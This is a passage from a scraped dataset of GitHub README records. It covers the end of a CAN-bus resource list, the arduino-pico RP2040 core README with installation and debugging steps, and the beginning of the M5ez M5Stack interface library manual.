send can-frames via udp over an wi-fi tunnel\nesp32_canbus_gateway - can module on esp32 + tja1050 coded on micropython\nesp32-cantroller - esp32-s2-wrover/wroom based canbus controller thingy\nesp32-canbus-logger - can bus logger on usd-card based on esp32\nesp32_canviewer - esp32 based can interface for your webbrowser\nesp-idf-can2http - canbus to http bridge using esp32\nsbc\nsbc - single board computers\nbeaglebone_black_socketcan - how to get access to the can bus on a beaglebone black via socketcan interface\nrpi-can-logger - project to log can bus data from a pican2 and a gps module\ncanopi - can interface for raspberry pi zero\nothers hw\nmichrochip can bus analyzer on pic18f2550/pic18f2680 firmware - michrochip can bus analyzer firmware\nmichrochip can bus analyzer on pic18f2550/pic18f2680 driver - linux kernel driver for microchip can bus analyzer tool\nbb-to-stm32 - led sync between beaglebone black and stm32f4 discovery board\nhardware related tools\ncan bus bit timing calculator - online tool for obsolete sja1000 and mcp2510 (probably it works for mcp2515)\nstm8s208 can speed calculator - can speed calculator for stm8 (perhaps it also works for stm32 family)\netc\nfollow this permanent root-repo for lastest updates: https://github.com/idoka/awesome-canbus\ntags\n#awesome #awesome-list #can #can-bus #canbus #canfd #can-fd #logger #sniffer #slcan #socketcan #car-hacking #bus-monitoring #lawicel #elm327 #obd2 #canutils #automotive #embedded #arduino #rpi #raspberry-pi #sae #uds #j1962 #j1939 #j1979 #j2534 #lin #lin-bus #local-interconnect-network #flexray #obd-ii #slcan-protocol #usbtin #usb2can #iso11898 #iso11565 #iso11765 #iso14229 #dbc #odb #ldf #electric-vehicles #vehicular-networks #python #automotive-security", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000145, "year": null}, {"Unnamed: 0": 2187, "autor": 147, "date": null, "content": "Arduino-Pico\nRaspberry Pi Pico Arduino core, for all RP2040 boards\nThis is a port of the RP2040 (Raspberry Pi Pico processor) to the Arduino ecosystem. It uses the bare Raspberry Pi Pico SDK and a custom GCC 10.3/Newlib 4.0 toolchain.\nDocumentation\nSee https://arduino-pico.readthedocs.io/en/latest/ along with the examples for more detailed usage information.\nSupported Boards\nRaspberry Pi Pico\nAdafruit Feather RP2040\nAdafruit ItsyBitsy RP2040\nAdafruit Macropad RP2040\nAdafruit QTPy RP2040\nAdafruit STEMMA Friend RP2040\nAdafruit Trinkey RP2040 QT\nArduino Nano RP2040 Connect (preliminary)\nCytron Maker Pi RP2040\nCytron Maker Nano RP2040\nInvector Labs Challenger RP2040 WiFi\nInvector Labs Challenger NB RP2040 WiFi\nInvector Labs Challenger RP2040 LTE\nInvector Labs RPICO32\nMelopero Shake RP2040\nSparkFun ProMicro RP2040\nuPesy RP2040 DevKit\nWIZnet W5100S-EVB-Pico\nGeneric (configurable flash, I/O pins)\nInstalling via Arduino Boards Manager\nWindows Users: Please do not use the Windows Store version of the actual Arduino application because it has issues detecting attached Pico boards. Use the \"Windows ZIP\" or plain \"Windows\" executable (EXE) download direct from https://arduino.cc. and allow it to install any device drivers it suggests. Otherwise the Pico board may not be detected. Also, if trying out the 2.0 beta Arduino please install the release 1.8 version beforehand to ensure needed device drivers are present. (See #20 for more details.)\nOpen up the Arduino IDE and go to File->Preferences.\nIn the dialog that pops up, enter the following URL in the \"Additional Boards Manager URLs\" field:\nhttps://github.com/earlephilhower/arduino-pico/releases/download/global/package_rp2040_index.json\nHit OK to close the dialog.\nGo to Tools->Boards->Board Manager in the IDE\nType \"pico\" in the search box and select \"Add\":\nInstalling via GIT\nTo install via GIT (for latest and greatest versions):\nmkdir -p ~/Arduino/hardware/pico\ngit clone https://github.com/earlephilhower/arduino-pico.git ~/Arduino/hardware/pico/rp2040\ncd ~/Arduino/hardware/pico/rp2040\ngit submodule update --init\ncd pico-sdk\ngit submodule update --init\ncd ../pico-extras\ngit submodule update --init\ncd ../tools\npython3 ./get.py\nInstalling both Arduino and CMake\nTom's Hardware presented a very nice writeup on installing arduino-pico on both Windows and Linux, available at https://www.tomshardware.com/how-to/program-raspberry-pi-pico-with-arduino-ide\nIf you follow Les' step-by-step you will also have a fully functional CMake-based environment to build Pico apps on if you outgrow the Arduino ecosystem.\nUploading Sketches\nTo upload your first sketch, you will need to hold the BOOTSEL button down while plugging in the Pico to your computer. Then hit the upload button and the sketch should be transferred and start to run.\nAfter the first upload, this should not be necessary as the arduino-pico core has auto-reset support. Select the appropriate serial port shown in the Arduino Tools->Port->Serial Port menu once (this setting will stick and does not need to be touched for multiple uploads). This selection allows the auto-reset tool to identify the proper device to reset. Them hit the upload button and your sketch should upload and run.\nIn some cases the Pico will encounter a hard hang and its USB port will not respond to the auto-reset request. Should this happen, just follow the initial procedure of holding the BOOTSEL button down while plugging in the Pico to enter the ROM bootloader.\nUploading Filesystem Images\nThe onboard flash filesystem for the Pico, LittleFS, lets you upload a filesystem image from the sketch directory for your sketch to use. Download the needed plugin from\nhttps://github.com/earlephilhower/arduino-pico-littlefs-plugin/releases\nTo install, follow the directions in\nhttps://github.com/earlephilhower/arduino-pico-littlefs-plugin/blob/master/README.md\nFor detailed usage information, please check the ESP8266 repo documentation (ignore SPIFFS related notes) available at\nhttps://arduino-esp8266.readthedocs.io/en/latest/filesystem.html\nUploading Sketches with Picoprobe\nIf you have built a Raspberry Pi Picoprobe, you can use OpenOCD to handle your sketch uploads and for debugging with GDB.\nUnder Windows a local admin user should be able to access the Picoprobe port automatically, but under Linux udev must be told about the device and to allow normal users access.\nTo set up user-level access to Picoprobes on Ubuntu (and other OSes which use udev):\necho 'SUBSYSTEMS==\"usb\", ATTRS{idVendor}==\"2e8a\", ATTRS{idProduct}==\"0004\", GROUP=\"users\", MODE=\"0666\"' | sudo tee -a /etc/udev/rules.d/98-PicoProbe.rules\nsudo udevadm control --reload\nThe first line creates a file with the USB vendor and ID of the Picoprobe and tells UDEV to give users full access to it. The second causes udev to load this new rule. Note that you will need to unplug and re-plug in your device the first time you create this file, to allow udev to make the device node properly.\nOnce Picoprobe permissions are set up properly, then select the board \"Raspberry Pi Pico (Picoprobe)\" in the Tools menu and upload as normal.\nUploading Sketches with pico-debug\npico-debug differs from Picoprobe in that pico-debug is a virtual debug pod that runs side-by-side on the same RP2040 that you run your code on; so, you only need one RP2040 board instead of two. pico-debug also differs from Picoprobe in that pico-debug is standards-based; it uses the CMSIS-DAP protocol, which means even software not specially written for the Raspberry Pi Pico can support it. pico-debug uses OpenOCD to handle your sketch uploads, and debugging can be accomplished with CMSIS-DAP capable debuggers including GDB.\nUnder Windows and macOS, any user should be able to access pico-debug automatically, but under Linux udev must be told about the device and to allow normal users access.\nTo set up user-level access to all CMSIS-DAP adapters on Ubuntu (and other OSes which use udev):\necho 'ATTRS{product}==\"*CMSIS-DAP*\", MODE=\"664\", GROUP=\"plugdev\"' | sudo tee -a /etc/udev/rules.d/98-CMSIS-DAP.rules\nsudo udevadm control --reload\nThe first line creates a file that recognizes all CMSIS-DAP adapters and tells UDEV to give users full access to it. The second causes udev to load this new rule. Note that you will need to unplug and re-plug in your device the first time you create this file, to allow udev to make the device node properly.\nOnce CMSIS-DAP permissions are set up properly, then select the board \"Raspberry Pi Pico (pico-debug)\" in the Tools menu.\nWhen first connecting the USB port to your PC, you must copy pico-debug-gimmecache.uf2 to the Pi Pico to load pico-debug into RAM; after this, upload as normal.\nDebugging with Picoprobe/pico-debug, OpenOCD, and GDB\nThe installed tools include a version of OpenOCD (in the pqt-openocd directory) and GDB (in the pqt-gcc directory). These may be used to run GDB in an interactive window as documented in the Pico Getting Started manuals from the Raspberry Pi Foundation. For pico-debug, replace the raspberrypi-swd and picoprobe example OpenOCD arguments of \"-f interface/raspberrypi-swd.cfg -f target/rp2040.cfg\" or \"-f interface/picoprobe.cfg -f target/rp2040.cfg\" respectively in the Pico Getting Started manual with \"-f board/pico-debug.cfg\".\nFeatures\nAdafruit TinyUSB Arduino (USB mouse, keyboard, flash drive, generic HID, CDC Serial, MIDI, WebUSB, others)\nGeneric Arduino USB Serial, Keyboard, and Mouse emulation\nFilesystems (LittleFS and SD/SDFS)\nMulticore support (setup1() and loop1())\nOverclocking and underclocking from the menus\ndigitalWrite/Read, shiftIn/Out, tone, analogWrite(PWM)/Read, temperature\nPeripherals: SPI master, Wire(I2C) master/slave, dual UART, emulated EEPROM, I2S audio output, Servo\nprintf (i.e. debug) output over USB serial\nThe RP2040 PIO state machines (SMs) are used to generate jitter-free:\nServos\nTones\nI2S Output\nTutorials from Across the Web\nHere are some links to coverage and additional tutorials for using arduino-pico\nThe File:: class is taken from the ESP8266. See https://arduino-esp8266.readthedocs.io/en/latest/filesystem.html\nArduino Support for the Pi Pico available! And how fast is the Pico? - https://youtu.be/-XHh17cuH5E\nPre-release Adafruit QT Py RP2040 - https://www.youtube.com/watch?v=sfC1msqXX0I\nAdafruit Feather RP2040 running LCD + TMP117 - https://www.youtube.com/watch?v=fKDeqZiIwHg\nDemonstration of Servos and I2C in Korean - https://cafe.naver.com/arduinoshield/1201\nContributing\nIf you want to contribute or have bugfixes, drop me a note at earlephilhower@yahoo.com or open an issue/PR here.\nLicensing and Credits\nThe Arduino IDE and ArduinoCore-API are developed and maintained by the Arduino team. The IDE is licensed under GPL.\nThe RP2040 GCC-based toolchain is licensed under under the GPL.\nThe Pico-SDK and Pico-Extras are by Raspberry Pi (Trading) Ltd and licensed under the BSD 3-Clause license.\nArduino-Pico core files are licensed under the LGPL.\nLittleFS library written by ARM Limited and released under the BSD 3-clause license.\nUF2CONV.PY is by Microsoft Corporation and licensed under the MIT license.\nSome filesystem code taken from the ESP8266 Arduino Core and licensed under the LGPL.\n-Earle F. Philhower, III earlephilhower@yahoo.com", "link": "https://github.com/earlephilhower/arduino-pico", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arduino-pico\nraspberry pi pico arduino core, for all rp2040 boards\nthis is a port of the rp2040 (raspberry pi pico processor) to the arduino ecosystem. it uses the bare raspberry pi pico sdk and a custom gcc 10.3/newlib 4.0 toolchain.\ndocumentation\nsee https://arduino-pico.readthedocs.io/en/latest/ along with the examples for more detailed usage information.\nsupported boards\nraspberry pi pico\nadafruit feather rp2040\nadafruit itsybitsy rp2040\nadafruit macropad rp2040\nadafruit qtpy rp2040\nadafruit stemma friend rp2040\nadafruit trinkey rp2040 qt\narduino nano rp2040 connect (preliminary)\ncytron maker pi rp2040\ncytron maker nano rp2040\ninvector labs challenger rp2040 wifi\ninvector labs challenger nb rp2040 wifi\ninvector labs challenger rp2040 lte\ninvector labs rpico32\nmelopero shake rp2040\nsparkfun promicro rp2040\nupesy rp2040 devkit\nwiznet w5100s-evb-pico\ngeneric (configurable flash, i/o pins)\ninstalling via arduino boards manager\nwindows users: please do not use the windows store version of the actual arduino application because it has issues detecting attached pico boards. use the \"windows zip\" or plain \"windows\" executable (exe) download direct from https://arduino.cc. and allow it to install any device drivers it suggests. otherwise the pico board may not be detected. also, if trying out the 2.0 beta arduino please install the release 1.8 version beforehand to ensure needed device drivers are present. (see #20 for more details.)\nopen up the arduino ide and go to file->preferences.\nin the dialog that pops up, enter the following url in the \"additional boards manager urls\" field:\nhttps://github.com/earlephilhower/arduino-pico/releases/download/global/package_rp2040_index.json\nhit ok to close the dialog.\ngo to tools->boards->board manager in the ide\ntype \"pico\" in the search box and select \"add\":\ninstalling via git\nto install via git (for latest and greatest versions):\nmkdir -p ~/arduino/hardware/pico\ngit clone https://github.com/earlephilhower/arduino-pico.git ~/arduino/hardware/pico/rp2040\ncd ~/arduino/hardware/pico/rp2040\ngit submodule update --init\ncd pico-sdk\ngit submodule update --init\ncd ../pico-extras\ngit submodule update --init\ncd ../tools\npython3 ./get.py\ninstalling both arduino and cmake\ntom's hardware presented a very nice writeup on installing arduino-pico on both windows and linux, available at https://www.tomshardware.com/how-to/program-raspberry-pi-pico-with-arduino-ide\nif you follow les' step-by-step you will also have a fully functional cmake-based environment to build pico apps on if you outgrow the arduino ecosystem.\nuploading sketches\nto upload your first sketch, you will need to hold the bootsel button down while plugging in the pico to your computer. then hit the upload button and the sketch should be transferred and start to run.\nafter the first upload, this should not be necessary as the arduino-pico core has auto-reset support. select the appropriate serial port shown in the arduino tools->port->serial port menu once (this setting will stick and does not need to be touched for multiple uploads). this selection allows the auto-reset -----> tool !!!  to identify the proper device to reset. them hit the upload button and your sketch should upload and run.\nin some cases the pico will encounter a hard hang and its usb port will not respond to the auto-reset request. should this happen, just follow the initial procedure of holding the bootsel button down while plugging in the pico to enter the rom bootloader.\nuploading filesystem images\nthe onboard flash filesystem for the pico, littlefs, lets you upload a filesystem image from the sketch directory for your sketch to use. download the needed plugin from\nhttps://github.com/earlephilhower/arduino-pico-littlefs-plugin/releases\nto install, follow the directions in\nhttps://github.com/earlephilhower/arduino-pico-littlefs-plugin/blob/master/readme.md\nfor detailed usage information, please check the esp8266 repo documentation (ignore spiffs related notes) available at\nhttps://arduino-esp8266.readthedocs.io/en/latest/filesystem.html\nuploading sketches with picoprobe\nif you have built a raspberry pi picoprobe, you can use openocd to handle your sketch uploads and for debugging with gdb.\nunder windows a local admin user should be able to access the picoprobe port automatically, but under linux udev must be told about the device and to allow normal users access.\nto set up user-level access to picoprobes on ubuntu (and other oses which use udev):\necho 'subsystems==\"usb\", attrs{idvendor}==\"2e8a\", attrs{idproduct}==\"0004\", group=\"users\", mode=\"0666\"' | sudo tee -a /etc/udev/rules.d/98-picoprobe.rules\nsudo udevadm control --reload\nthe first line creates a file with the usb vendor and id of the picoprobe and tells udev to give users full access to it. the second causes udev to load this new rule. note that you will need to unplug and re-plug in your device the first time you create this file, to allow udev to make the device node properly.\nonce picoprobe permissions are set up properly, then select the board \"raspberry pi pico (picoprobe)\" in the tools menu and upload as normal.\nuploading sketches with pico-debug\npico-debug differs from picoprobe in that pico-debug is a virtual debug pod that runs side-by-side on the same rp2040 that you run your code on; so, you only need one rp2040 board instead of two. pico-debug also differs from picoprobe in that pico-debug is standards-based; it uses the cmsis-dap protocol, which means even software not specially written for the raspberry pi pico can support it. pico-debug uses openocd to handle your sketch uploads, and debugging can be accomplished with cmsis-dap capable debuggers including gdb.\nunder windows and macos, any user should be able to access pico-debug automatically, but under linux udev must be told about the device and to allow normal users access.\nto set up user-level access to all cmsis-dap adapters on ubuntu (and other oses which use udev):\necho 'attrs{product}==\"*cmsis-dap*\", mode=\"664\", group=\"plugdev\"' | sudo tee -a /etc/udev/rules.d/98-cmsis-dap.rules\nsudo udevadm control --reload\nthe first line creates a file that recognizes all cmsis-dap adapters and tells udev to give users full access to it. the second causes udev to load this new rule. note that you will need to unplug and re-plug in your device the first time you create this file, to allow udev to make the device node properly.\nonce cmsis-dap permissions are set up properly, then select the board \"raspberry pi pico (pico-debug)\" in the tools menu.\nwhen first connecting the usb port to your pc, you must copy pico-debug-gimmecache.uf2 to the pi pico to load pico-debug into ram; after this, upload as normal.\ndebugging with picoprobe/pico-debug, openocd, and gdb\nthe installed tools include a version of openocd (in the pqt-openocd directory) and gdb (in the pqt-gcc directory). these may be used to run gdb in an interactive window as documented in the pico getting started manuals from the raspberry pi foundation. for pico-debug, replace the raspberrypi-swd and picoprobe example openocd arguments of \"-f interface/raspberrypi-swd.cfg -f target/rp2040.cfg\" or \"-f interface/picoprobe.cfg -f target/rp2040.cfg\" respectively in the pico getting started manual with \"-f board/pico-debug.cfg\".\nfeatures\nadafruit tinyusb arduino (usb mouse, keyboard, flash drive, generic hid, cdc serial, midi, webusb, others)\ngeneric arduino usb serial, keyboard, and mouse emulation\nfilesystems (littlefs and sd/sdfs)\nmulticore support (setup1() and loop1())\noverclocking and underclocking from the menus\ndigitalwrite/read, shiftin/out, tone, analogwrite(pwm)/read, temperature\nperipherals: spi master, wire(i2c) master/slave, dual uart, emulated eeprom, i2s audio output, servo\nprintf (i.e. debug) output over usb serial\nthe rp2040 pio state machines (sms) are used to generate jitter-free:\nservos\ntones\ni2s output\ntutorials from across the web\nhere are some links to coverage and additional tutorials for using arduino-pico\nthe file:: class is taken from the esp8266. see https://arduino-esp8266.readthedocs.io/en/latest/filesystem.html\narduino support for the pi pico available! and how fast is the pico? - https://youtu.be/-xhh17cuh5e\npre-release adafruit qt py rp2040 - https://www.youtube.com/watch?v=sfc1msqxx0i\nadafruit feather rp2040 running lcd + tmp117 - https://www.youtube.com/watch?v=fkdeqziiwhg\ndemonstration of servos and i2c in korean - https://cafe.naver.com/arduinoshield/1201\ncontributing\nif you want to contribute or have bugfixes, drop me a note at earlephilhower@yahoo.com or open an issue/pr here.\nlicensing and credits\nthe arduino ide and arduinocore-api are developed and maintained by the arduino team. the ide is licensed under gpl.\nthe rp2040 gcc-based toolchain is licensed under under the gpl.\nthe pico-sdk and pico-extras are by raspberry pi (trading) ltd and licensed under the bsd 3-clause license.\narduino-pico core files are licensed under the lgpl.\nlittlefs library written by arm limited and released under the bsd 3-clause license.\nuf2conv.py is by microsoft corporation and licensed under the mit license.\nsome filesystem code taken from the esp8266 arduino core and licensed under the lgpl.\n-earle f. philhower, iii earlephilhower@yahoo.com", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000147, "year": null}, {"Unnamed: 0": 2199, "autor": 159, "date": null, "content": "M5ez The easy way to program on the M5Stack\nM5ez (pronounced \"M5 easy\") is a complete interface builder library for the M5Stack ESP32 system. It allows even novice programmers to create good looking interfaces. It comes with menus as text or as images, message boxes, very flexible button setup (including different length presses and multi-button functions), 3-button text input (you have to see it to believe it) and built-in Wifi support. Now you can concentrate on what your program does, and let M5ez worry about everything else.\nwritten by Rop Gonggrijp, with help and contributions from many others\nIntroduction\nThe M5Stack is a small computer that is a tinkerer's dream. It is based on Espressif's ESP32 chip (with WiFi and Bluetooth), it has a 320x240 pixel color screen, three buttons, a speaker, an SD slot and it allows you to stack boards below it, each in their own plastic enclosure. The makers sell boards for GSM, GPS and LoRa (LOng RAnge radio) as well as a motor controller board and an empty experimenter board. The Chinese operation that makes them appears to sell a lot of them and I could get mine off of Amazon in a week. If you like to build things that you can hold in your hand and not just write code for yet another naked-looking board plugged into your USB port, this thing is your friend.\nOn the software side, the easiest way to program these is using the Arduino IDE. M5Stack provides a library which, when you include it, creates an m5 object instance that allows access to the various hardware components in the device. For instance: the display driver is accessible through commands all starting with m5.lcd..\nMaking something that looks good and allows users to interact with it is not simple though: you have to program everything yourself. If you try to make something a little more complex, you quickly get bogged down in figuring out where things go on the display, what state your interface is in, etc etc.\nIn the budding M5Stack community, there have been some initiatives to make it easier to create user interfaces. Most notably a M5Stack forum user named Calin make something called \"M5Stack MultiApp\" which allows more easy integration of multiple existing programs into one app. His work serves as an inspiration for my work. But as much as you could have multiple programs have a common user interface, creating the programs still was nowhere near simple enough.\nEnter M5ez, our contribution to making programming on the M5Stack a lot easier. We hope you'll enjoy programming with this.\nOther products by M5\nM5 is not only making the M5stack anymore. There's now an M5Stick that is an even smaller ESP32 system with a smaller screen, there's the M5 Atom which has no screen and just LEDs, and soon there will be an M5stack Core2 which has a capacitive touch screen. We plan to support some of these devices, the stick support will be rolled out soon.\nAlternatives\nUiFlow\nSince writing M5ez, there has been another interface toolkit for the M5Stack, called UiFlow. It uses a web-and-cloud-based IDE that can be seen as \"blocky\" symbols or as python and creates micropython code. UiFlow supports a lot of the hardware sold in conjunction with the M5Stack and is very much geared towards learning and education.\nThat said, building the functionality that comes \"packaged\" with M5ez would take quite a bit of work with UiFlow. If you have existing things that run on Arduino, like programming in C and/or with the Arduino IDE, then M5ez might be the better choice. Also it is generally easier to create consistent and visually pleasing interfaces in M5ez, and complex things can take surprisingly little work.\nGetting started\nM5ez is an Arduino library. To start using it with the Arduino IDE:\nChoose Sketch -> Include Library -> Manage Libraries...\nType M5ez into the search box.\nClick the row to select the library.\nClick the Install button to install the library.\nRepeat this process for the ezTime library\nin File -> Examples you will now see an M5ez heading down under \"Examples from custom libraries\"\nYou'll have your first application on the screen in no time. You can also start with one of the sketches below in the \"Menus\" section of the documentation. In fact we strongly recommend that you play around with the M5ez demo application, since it is a comprehensive showcase of M5ez's functionality that will give you a good feel for what you can and cannot do with M5ez.\nIf you get fatal error: ezTime.h: No such file or directory\nNote that it says above that you need to install two libraries: M5ez and ezTime.\nAlternatively, you can install M5ez without the time library (and without the on-screen clock), by commenting out #define M5EZ_CLOCK in file m5ez.h in the M5ez library directory.\nStructure of documentation\nYou've now seen the Introduction and Getting Started sections of the manual. Below is the User Manual which lists all the functions of M5ez in detail. At the end there's a Table of Contents which may be of help finding something.\nTech Notes\nSeparate from this document, there is a directory tech_notes where we keep useful technical notes that may be a bit too obscure or in-depth for a general user manual.\nM5ez User Manual\nM5ez is a complete system for building appliance-grade interfaces for the M5Stack. It comes with a lot of the common functionality built-in that a programmer would otherwise have to create. While it is very easy to create functional programs \u2014 just have a look at the examples that come with the library \u2014 the entire library can be a bit overwhelming because of how much it offers. The following is a reference for programmers that want to get the most out of M5ez. It is certainly not necessary to know or fully understand every function, but at some point you probably want to go through this document very quickly to see what M5ez can do for you.\nIf you feel anything is still unclear after reading this document, please file an issue in the repository. I take documentation seriously \u2014 if something is not clear in here, it is as much a bug as something that's wrong with the software itself. Pull requests for typos etc. gladly accepted.\nHow it all works\nAs you can see from the examples, the commands that activate M5ez's functionality start with ez.. That ez refers to an object ez that is within the \"root namespace\" of the sketch. Within it are commands like ez.msgBox, but also other objects. For instance: commands that deal with the entire screen are prefixed with ez.screen., WiFi commands start with ez.wifi. and so forth.\nAfter you include the library with #include <M5ez.h>, those objects all exist. To get things going you then \u2014 in the void setup() part of your sketch \u2014 do ez.begin(). This replaces m5.begin, which is called from within ez.begin(). You still need to #include <M5Stack.h> before #include <M5ez.h> if you want to use any commands from the m5 library in your sketch.\nScreen\nThe screen object deals with the entire screen, which consists of an optional header at the top, optional buttons at the bottom and an area called \"the canvas\" in between.\nvoid ez.screen.clear()\nvoid ez.screen.clear(uint16_t color)\nuint16_t ez.screen.background()\nIf you clear the screen, the header and buttons are hidden, the canvas is cleared, and the current background color is set to the color you specify, or to the background color from the current theme (ez.theme->background, see the chapter on themes) if you do not specify a color. ez.screen.background() will return the currently set background color.\nIf you clear the screen, the header and buttons are hidden, so the canvas takes up the entire screen.\nHeader\nThe header is the bar at the top of the screen. In the default theme it is 30 pixels high and blue, and it has text in font &FreeSansBold9pt7b, but all of that can be changed, either by modifying the values in the current theme on the fly or by creating your own theme.\nShowing, hiding, title\nvoid ez.header.show(String title = \"\")\nvoid ez.header.title(String title = \"\")\nbool ez.header.shown()\nvoid ez.header.clear(bool wipe = true)\nez.header.show will show the header, either with the present title or with a new one provided as an argument. ez.header.title will merely change the title, but will not change whether the header is displayed or not. ez.header.shown() returns true or false depending on whether the header is currently shown, and ez.header.clear removes the header, returning the top of the screen to the canvas. If you set wipe to false, it will not draw background pixels there. (This may help prevent flicker or add a bit of performance if you're about to clear the canvas anyway.)\nYour own header widgets\nThe clock and WiFi signal strength displayed in the M5ez header are \"widgets\". You can register your own code to display widgets too.\nvoid ez.header.insert(uint8_t position, String name, uint16_t width, void (*function)(uint16_t x, uint16_t w), bool leftover = false)\nvoid ez.header.remove(String name)\nuint8_t ez.header.position(String name)\nvoid ez.header.draw(String name = \"\")\nez.header.insert lets you add your own header widget. The header widget positions start at 0 (the leftmost widget), and position specifies t the left of which widget to insert the new one. name is just a name you use to refer to your widget. The names title, clock and wifi are reserved for use by M5ez.\nExactly one widget can be specified as leftover, meaning it gets all the pixels not claimed by any other widgets. By default, this is the widget called \"title\" that holds the header title. All other widgets must have a width in pixels specified.\nfunction refers to the name of the function that draws your widget. It must be a function that returns nothing (void) and that takes two uint16_t arguments: the x position and width of your widget. This function will be called by the header code whenever the header is redrawn. But you can also force a redraw with ez.header.draw. For instance: the clock code calls for the clock widget to be redrawn every minute, for instance. Note that you would never call your widget draw function directly, because your code doesn't know where all the widgets are within the header. You would only ever call it indirectly using ez.header.draw(\"your_widget_name\"), which will then see if the header is currently displayed, and if so lookup x position and width and call your draw function.\nYour widget draw function has to make sure to stay inside the lines: not lower than ez.theme->header_height, not further left than x, not further right than x + w. If you want to be able to use your widget with multiple themes, your code should probably also respect ez.theme->header_bgcolor and ez.theme->header_fgcolor to make sure things look pretty.\nez.header.position will return the relative position of an existing header widget, starting with 0 for the leftmost widget, adding one for each further widget. This can be quite useful. For instance, if you want to make sure a widget is insert directly to the left of the title, you can specify ez.header.insert(ez.header.position(\"title\"), .... If you specify (ez.header.position(\"title\") + 1 your new widget gets inserted directly to the right of the title.\nAs the name implies, ez.header.remove removes the widget with the given name.\nCanvas\nThe \"canvas\" is M5ez's name for the area between the header and buttons. So if there are no header and no buttons, the canvas is the whole screen. Once they are drawn, the canvas becomes smaller.\nvoid ez.canvas.clear()\nClears the canvas area to the current background color \u2014 either the default from the theme or the one specified in the most recent ez.screen.clear command. Sets x and y positions for the the next print command to the top left (respecting the currently set left margin).\nvoid ez.canvas.reset()\nReset does everything ez.canvas.clear() does, but also turns on text wrap, turns off scrolling, sets the print font and color back to the defaults from the theme and sets the left margin to 0.\nCanvas dimensions\nBecause the canvas size differs when header or buttons are shown, your code can ask for various locations and dimensions of the canvas as follows:\nuint8_t ez.canvas.top()\nuint8_t ez.canvas.bottom()\nuint16_t ez.canvas.left()\nuint16_t ez.canvas.right()\nuint8_t ez.canvas.height()\nuint16_t ez.canvas.width()\nPrinting to the canvas\nThe M5ez canvas inherits from the Arduino Print object. What that means is that you can use the print and println functions in just the way you are used to using them. Here's all the different arguments taken by printf, print and println.\nsize_t ez.canvas.printf(const char * format, ...) __attribute__ ((format (printf, 2, 3)));\nsize_t ez.canvas.print(const __FlashStringHelper *);\nsize_t ez.canvas.print(const String &);\nsize_t ez.canvas.print(const char[]);\nsize_t ez.canvas.print(char);\nsize_t ez.canvas.print(unsigned char, int = DEC);\nsize_t ez.canvas.print(int, int = DEC);\nsize_t ez.canvas.print(unsigned int, int = DEC);\nsize_t ez.canvas.print(long, int = DEC);\nsize_t ez.canvas.print(unsigned long, int = DEC);\nsize_t ez.canvas.print(double, int = 2);\nsize_t ez.canvas.print(const Printable&);\nsize_t ez.canvas.print(struct tm * timeinfo, const char * format = NULL);\nsize_t ez.canvas.println(const __FlashStringHelper *);\nsize_t ez.canvas.println(const String &s);\nsize_t ez.canvas.println(const char[]);\nsize_t ez.canvas.println(char);\nsize_t ez.canvas.println(unsigned char, int = DEC);\nsize_t ez.canvas.println(int, int = DEC);\nsize_t ez.canvas.println(unsigned int, int = DEC);\nsize_t ez.canvas.println(long, int = DEC);\nsize_t ez.canvas.println(unsigned long, int = DEC);\nsize_t ez.canvas.println(double, int = 2);\nsize_t ez.canvas.println(const Printable&);\nsize_t ez.canvas.println(struct tm * timeinfo, const char * format = NULL);\nsize_t ez.canvas.println(void);\nbool ez.canvas.scroll()\nvoid ez.canvas.scroll(bool s)\nIf you turn on scrolling with ez.canvas.scroll(true), M5ez will store what has been printed to the screen, so the contents of the screen can scroll. Note that when the canvas starts scrolling, only the contents placed there with the print functions from above will scroll, everything else will be wiped. So if, for example, you have drawn something with m5.lcs.fillRect, it will be gone once you print beyond the last line.\nYou can turn scrolling off with ez.canvas.scroll(false), and you can ask what the present scroll status is with ez.canvas.scroll().\nNote on scrolling: for scrolling to work, everything that is printed to the screen is kept in memory. It is only forgotten if it scrolls off the screen or if you clear the canvas or screen. What that means is that if you turn scrolling on and then print and overwrite something lots of times, eventually the memory will fill up and your application will crash.\nbool ez.canvas.wrap()\nvoid ez.canvas.wrap(bool w)\nwrap determines whether the excess from the print functions that doesn't fit the current line is wrapped to the next line.\nuint16_t ez.canvas.lmargin()\nvoid ez.canvas.lmargin(uint16_t newmargin)\nAsk for and set the left margin for printing.\nvoid ez.canvas.font(const GFXfont* font)\nconst GFXfont* ez.canvas.font()\nvoid ez.canvas.color(uint16_t color)\nuint16_t ez.canvas.color()\nAsk for and set the font and color for printing.\nuint16_t ez.canvas.x()\nvoid ez.canvas.x(uint16_t newx)\nuint8_t ez.canvas.y()\nvoid ez.canvas.y(uint8_t newy)\nvoid pos(uint16_t x, uint8_t y)\nAsk for and set the x and y position for the next print command.\nButtons\nThere are only three buttons on the M5Stack. To make sure we can make good use of our rare buttons, we can assign two functions to each button: one for a short press and one for a slightly longer press. We can also assign functions to all three combinations of two keys being pressed simultaneously (AB, BC and AC). So there is a total of nine possible key functions we can assign. The functions for a single key are displayed in the bottom row of the display, the functions for key combinations in a row above. Each key has a 'name' (which is also what is returned to the program if it is pressed and a 'caption', which is what is displayed on the key.\nBecause there are multiple functions that get told what buttons are going to be displayed, it would get a little hairy to give each of these function 18 possible arguments for the key names and captions. So for your convenience, all the keys you want displayed and detected are specified as one string. The different key names and captions are separated with hashes. You can specify one key name like OK, which means you will only use the middle button, it will say OK on it and it will also return the string \"OK\" to your code.\nIf you specify three keys, like yes # no # maybe you will get three buttons with only one function per button. If you specify six keys, they will be the short and long presses for each key. If you specify nine, the last three will specify the AB, BC and AC button-combo functions respectively. Specifying any other number of keys does not work, so the string should always contain one, three, six or nine parts, separated by hashes.\nThe captions on the key can differ from the name. To specify this, specify a name, followed by a pipe sign (|) followed by the caption. So one | un # two | deux # three | trois specifies three keys that each show a number in french but return the number in english. Note that any spaces around the hashes or pipe signs in the string are ignored, to allow you to make things more readable in your code.\nIf your button is captioned up, down, left or right, the caption is replaced by a triangle pointing in that direction.\nIf a button has only one function, (no long press defined), the caption will be printed in the middle. If there is a short and a long press defined, they will be printed on the left and right, the right in cyan (in the default theme) to signify that it needs a longer press.\nIn some cases it may be necessary to define only a long or only a short press action explicitly. In that case, defining a the key with the placeholder \"~\" will make sure its function is not interpreted. Take the key definition string ~ # up # select # # right # down: this defines the leftmost key to have the 'up' function, but only with a long press, a short press is ignored. The caption prints on the right side of the button and 